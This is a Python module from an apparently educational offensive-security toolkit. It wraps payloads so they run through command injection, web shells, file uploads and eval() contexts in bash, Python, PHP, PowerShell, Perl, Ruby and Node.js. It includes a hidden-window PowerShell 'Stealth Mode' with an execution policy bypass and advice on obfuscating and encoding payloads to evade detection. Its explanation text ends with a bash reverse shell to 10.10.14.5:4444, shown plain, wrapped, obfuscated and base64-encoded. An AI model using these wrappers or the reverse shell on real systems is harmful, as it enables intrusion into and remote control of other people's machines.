"""
Payload wrappers for different execution contexts
"""

from typing import List, Tuple
from learnshells.utils.logger import Logger


class Wrapper:
    """Wrap payloads for different execution contexts."""
    
    def __init__(self, logger: Logger = None):
        """
        Initialize wrapper.
        
        Args:
            logger: Logger instance
        """
        self.logger = logger or Logger()
    
    # ========== Bash Wrappers ==========
    
    def wrap_bash(self, payload: str) -> List[Tuple[str, str]]:
        """
        Generate multiple wrapped Bash variants.
        
        Args:
            payload: Original bash payload
            
        Returns:
            List of (name, wrapped_payload) tuples
        """
        variants = []
        
        # Variant 1: bash -c wrapper (web shell context)
        variants.append((
            "Bash -c (Web Shell)",
            f"bash -c '{payload}'"
        ))
        
        # Variant 2: sh -c wrapper
        variants.append((
            "SH -c Wrapper",
            f"sh -c '{payload}'"
        ))
        
        # Variant 3: eval wrapper
        variants.append((
            "Eval Wrapper",
            f"eval '{payload}'"
        ))
        
        # Variant 4: Command substitution
        variants.append((
            "Command Substitution",
            f"$({payload})"
        ))
        
        # Variant 5: Semicolon prefix (command chaining)
        variants.append((
            "Command Chain",
            f";{payload}"
        ))
        
        self.logger.success(f"Generated {len(variants)} Bash wrapper variants")
        return variants
    
    # ========== Python Wrappers ==========
    
    def wrap_python(self, payload: str) -> List[Tuple[str, str]]:
        """
        Generate multiple wrapped Python variants.
        
        Args:
            payload: Original python code
            
        Returns:
            List of (name, wrapped_payload) tuples
        """
        variants = []
        
        # Variant 1: python -c wrapper
        variants.append((
            "Python -c",
            f'python -c "{payload}"'
        ))
        
        # Variant 2: python3 -c wrapper
        variants.append((
            "Python3 -c",
            f'python3 -c "{payload}"'
        ))
        
        # Variant 3: python2 -c wrapper (legacy)
        variants.append((
            "Python2 -c",
            f'python2 -c "{payload}"'
        ))
        
        # Variant 4: Exec wrapper (for eval contexts)
        variants.append((
            "Exec Wrapper",
            f'exec("{payload}")'
        ))
        
        self.logger.success(f"Generated {len(variants)} Python wrapper variants")
        return variants
    
    # ========== PHP Wrappers ==========
    
    def wrap_php(self, payload: str) -> List[Tuple[str, str]]:
        """
        Generate multiple wrapped PHP variants.
        
        Args:
            payload: Original PHP code
            
        Returns:
            List of (name, wrapped_payload) tuples
        """
        variants = []
        
        # Variant 1: php -r wrapper (command line)
        variants.append((
            "PHP -r",
            f'php -r "{payload}"'
        ))
        
        # Variant 2: Full PHP tags (file upload)
        variants.append((
            "Full PHP Tags",
            f"<?php {payload} ?>"
        ))
        
        # Variant 3: Short echo tags
        variants.append((
            "Short Tags",
            f"<?= {payload} ?>"
        ))
        
        # Variant 4: Eval wrapper
        variants.append((
            "Eval Wrapper",
            f'<?php eval("{payload}"); ?>'
        ))
        
        self.logger.success(f"Generated {len(variants)} PHP wrapper variants")
        return variants
    
    # ========== PowerShell Wrappers ==========
    
    def wrap_powershell(self, payload: str) -> List[Tuple[str, str]]:
        """
        Generate multiple wrapped PowerShell variants.
        
        Args:
            payload: Original powershell code
            
        Returns:
            List of (name, wrapped_payload) tuples
        """
        variants = []
        
        # Variant 1: powershell -c wrapper
        variants.append((
            "PowerShell -c",
            f'powershell -c "{payload}"'
        ))
        
        # Variant 2: powershell -Command wrapper
        variants.append((
            "PowerShell -Command",
            f'powershell -Command "{payload}"'
        ))
        
        # Variant 3: powershell with execution policy bypass
        variants.append((
            "ExecutionPolicy Bypass",
            f'powershell -ExecutionPolicy Bypass -Command "{payload}"'
        ))
        
        # Variant 4: Hidden window
        variants.append((
            "Hidden Window",
            f'powershell -WindowStyle Hidden -Command "{payload}"'
        ))
        
        # Variant 5: Full stealth mode
        variants.append((
            "Stealth Mode",
            f'powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command "{payload}"'
        ))
        
        self.logger.success(f"Generated {len(variants)} PowerShell wrapper variants")
        return variants
    
    # ========== Perl Wrappers ==========
    
    def wrap_perl(self, payload: str) -> List[Tuple[str, str]]:
        """
        Generate multiple wrapped Perl variants.
        
        Args:
            payload: Original perl code
            
        Returns:
            List of (name, wrapped_payload) tuples
        """
        variants = []
        
        # Variant 1: perl -e wrapper
        variants.append((
            "Perl -e",
            f"perl -e '{payload}'"
        ))
        
        # Variant 2: perl with modules
        variants.append((
            "Perl with Socket",
            f"perl -MSocket -e '{payload}'"
        ))
        
        # Variant 3: perl with IO::Socket
        variants.append((
            "Perl with IO::Socket",
            f"perl -MIO::Socket -e '{payload}'"
        ))
        
        self.logger.success(f"Generated {len(variants)} Perl wrapper variants")
        return variants
    
    # ========== Ruby Wrappers ==========
    
    def wrap_ruby(self, payload: str) -> List[Tuple[str, str]]:
        """
        Generate multiple wrapped Ruby variants.
        
        Args:
            payload: Original ruby code
            
        Returns:
            List of (name, wrapped_payload) tuples
        """
        variants = []
        
        # Variant 1: ruby -e wrapper
        variants.append((
            "Ruby -e",
            f"ruby -e '{payload}'"
        ))
        
        # Variant 2: ruby with require
        variants.append((
            "Ruby with Socket",
            f"ruby -rsocket -e '{payload}'"
        ))
        
        # Variant 3: Eval wrapper
        variants.append((
            "Eval Wrapper",
            f'ruby -e "eval(\\"{payload}\\")"'
        ))
        
        self.logger.success(f"Generated {len(variants)} Ruby wrapper variants")
        return variants
    
    # ========== Node.js Wrappers ==========
    
    def wrap_nodejs(self, payload: str) -> List[Tuple[str, str]]:
        """
        Generate multiple wrapped Node.js variants.
        
        Args:
            payload: Original nodejs code
            
        Returns:
            List of (name, wrapped_payload) tuples
        """
        variants = []
        
        # Variant 1: node -e wrapper
        variants.append((
            "Node -e",
            f"node -e '{payload}'"
        ))
        
        # Variant 2: nodejs -e wrapper (alternative binary)
        variants.append((
            "NodeJS -e",
            f"nodejs -e '{payload}'"
        ))
        
        # Variant 3: Eval wrapper
        variants.append((
            "Eval Wrapper",
            f"node -e 'eval(\"{payload}\")'"
        ))
        
        # Variant 4: IIFE wrapper
        variants.append((
            "IIFE Wrapper",
            f"node -e '(function(){{{payload}}})()'"
        ))
        
        self.logger.success(f"Generated {len(variants)} Node.js wrapper variants")
        return variants
    
    # ========== General Methods ==========
    
    def explain_wrappers(self) -> str:
        """Explain wrapper usage and contexts."""
        explanation = """
🎓 PAYLOAD WRAPPERS EXPLAINED:

What are Wrappers?
Wrappers are execution contexts that surround your payload
to make it work in different exploitation scenarios.

Why Use Wrappers?

Different vulnerabilities require different payload formats:

1. WEB SHELLS:
   Context: PHP/JSP web shells with command execution
   Need: bash -c 'payload'
   Why: Web shells often use system() which needs shell context
   
2. COMMAND INJECTION:
   Context: Direct OS command injection
   Need: ;payload or $(payload)
   Why: Chain commands or substitute in existing commands
   
3. FILE UPLOAD:
   Context: Upload PHP/JSP/ASPX files
   Need: <?php payload ?>
   Why: Need proper language tags for file execution
   
4. EVAL() CONTEXTS:
   Context: Application-level eval()
   Need: eval("payload")
   Why: Code executed within interpreter context
   
5. RESTRICTED SHELLS:
   Context: Limited command execution
   Need: python -c "payload"
   Why: Invoke interpreter directly

Common Wrapper Patterns:

BASH/SHELL:
• bash -c 'command'     - Execute via bash
• sh -c 'command'       - Execute via sh
• eval 'command'        - Evaluate string
• $(command)            - Command substitution
• ;command              - Command chaining

PYTHON:
• python -c "code"      - Command line execution
• python3 -c "code"     - Python 3 specific
• exec("code")          - Eval context

PHP:
• php -r "code"         - Command line
• <?php code ?>         - Full tags (file upload)
• <?= code ?>           - Short echo tags
• eval("code")          - Eval context

POWERSHELL:
• powershell -c "code"              - Basic execution
• powershell -Command "code"        - Explicit command
• powershell -ExecutionPolicy Bypass - Bypass restrictions
• powershell -WindowStyle Hidden    - Hide window

PERL:
• perl -e 'code'        - Command line
• perl -MSocket -e      - With modules

RUBY:
• ruby -e 'code'        - Command line
• ruby -rsocket -e      - With requires

NODE.JS:
• node -e 'code'        - Command line
• nodejs -e 'code'      - Alternative binary
• eval("code")          - Eval context

Choosing the Right Wrapper:

Ask yourself:
1. What type of vulnerability? (RCE, upload, injection)
2. What's the execution context? (shell, web, eval)
3. What interpreter is available? (bash, python, php)
4. Are there restrictions? (execution policy, shell limits)

Examples:

Scenario 1: PHP Web Shell
Vulnerability: File upload
Wrapper: <?php payload ?>
Why: Need PHP tags for file to execute

Scenario 2: Command Injection
Vulnerability: OS command injection in parameter
Wrapper: bash -c 'payload'
Why: System() call needs shell context

Scenario 3: Python Eval
Vulnerability: Unsafe eval() in Python app
Wrapper: exec("payload")
Why: Code must be valid Python expression

Scenario 4: Restricted PowerShell
Vulnerability: PowerShell remoting
Wrapper: powershell -ExecutionPolicy Bypass -Command "payload"
Why: Bypass execution restrictions

Best Practices:

• Test wrapper locally first
• Understand your exploitation context
• Some wrappers can be combined
• Consider escaping requirements
• Watch for special character issues
• May need to adjust quotes (' vs ")

Wrapper Order:

When combining techniques:
1. Generate base payload
2. Apply wrapper (execution context)
3. Apply obfuscation (evade detection)
4. Apply encoding (hide content)

Example:
Base: /bin/bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
Wrapped: bash -c '/bin/bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
Obfuscated: bash -c '$0 -i >& /dev/tcp/10.10.14.5/4444 0>&1'
Encoded: echo <base64> | base64 -d | bash
"""
        return explanation
